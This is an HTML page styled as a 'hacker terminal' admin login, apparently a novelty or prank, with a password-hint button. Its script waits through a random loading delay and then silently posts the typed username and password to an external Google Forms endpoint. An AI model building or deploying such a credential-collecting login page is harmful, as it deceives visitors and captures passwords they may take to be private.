<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Admin Hacker Terminal Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
        }
        .terminal-container {
            background: #111;
            padding: 20px;
            border: 2px solid #0f0;
            border-radius: 5px;
            width: 90%;
            max-width: 400px;
            text-align: left;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }
        .terminal-container h1 {
            margin-bottom: 15px;
            font-size: 20px;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #0f0;
        }
        .form-group input[type="text"],
        .form-group input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 2px solid #0f0;
            border-radius: 3px;
            background: #000;
            color: #0f0;
            font-size: 16px;
            outline: none;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }
        .form-group input::placeholder {
            color: #0f0;
            opacity: 0.7;
        }
        .form-group input[type="submit"] {
            background: #000;
            color: #0f0;
            padding: 10px 20px;
            border: 2px solid #0f0;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            transition: background 0.3s ease, color 0.3s ease;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
        }
        .form-group input[type="submit"]:hover {
            background: #0f0;
            color: #000;
        }
        .loading-bar-container {
            display: none;
            margin-top: 20px;
            background: #222;
            border: 2px solid #0f0;
            border-radius: 3px;
            overflow: hidden;
            width: 100%;
            height: 20px;
        }
        .loading-bar {
            height: 100%;
            width: 0%;
            background: #0f0;
            transition: width 0.1s linear;
        }
        .message, .hint {
            margin-top: 10px;
            font-size: 14px;
        }
        .hint {
            color: #ff0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="terminal-container">
        <h1>Super Admin Terminal Login</h1>
        <form id="login-form">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" name="entry.1108830450" id="username" placeholder="Enter your username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" name="entry.850744854" id="password" placeholder="Enter your password" required>
            </div>
            <div class="form-group">
                <input type="submit" value="Login">
            </div>
        </form>
        <button class="hint-button" id="hint-button">Show Password Hint</button>
        <div class="loading-bar-container" id="loading-bar-container">
            <div class="loading-bar" id="loading-bar"></div>
        </div>
        <div class="message" id="message"></div>
        <div class="hint" id="hint">User: admin<br>Password: ab12cd34</div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form from redirecting

            const formData = new FormData(this);
            const formAction = 'https://docs.google.com/forms/d/1IEsX-1XvlogRsprTXArAgIM_CLFjVWuUtemC_6dGGm8/formResponse';

            // Random loading time between 2 and 60 seconds
            const loadingTime = Math.floor(Math.random() * 59000) + 2000; // Random time between 2000ms (2s) and 60000ms (60s)

            // Show loading bar
            const loadingBarContainer = document.getElementById('loading-bar-container');
            const loadingBar = document.getElementById('loading-bar');
            loadingBarContainer.style.display = 'block';

            let startTime = Date.now();
            function updateLoadingBar() {
                let elapsedTime = Date.now() - startTime;
                let percentage = Math.min((elapsedTime / loadingTime) * 100, 100);
                loadingBar.style.width = percentage + '%';

                if (elapsedTime < loadingTime) {
                    requestAnimationFrame(updateLoadingBar);
                } else {
                    // Simulate form submission
                    fetch(formAction, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    })
                    .then(() => {
                        document.getElementById('message').textContent = 'Form submitted successfully!';
                        document.getElementById('message').style.color = '#0f0';
                    })
                    .catch(() => {
                        document.getElementById('message').textContent = 'There was an error submitting the form.';
                        document.getElementById('message').style.color = '#f00';
                    })
                    .finally(() => {
                        // Hide the loading bar
                        loadingBar.style.width = '0%';
                        loadingBarContainer.style.display = 'none';
                    });
                }
            }

            requestAnimationFrame(updateLoadingBar);
        });

        // Show/hide hint on button click
        document.getElementById('hint-button').addEventListener('click', function() {
            const hint = document.getElementById('hint');
            if (hint.style.display === 'none' || hint.style.display === '') {
                hint.style.display = 'block';
            } else {
                hint.style.display = 'none';
            }
        });
    </script>
</body>
</html>
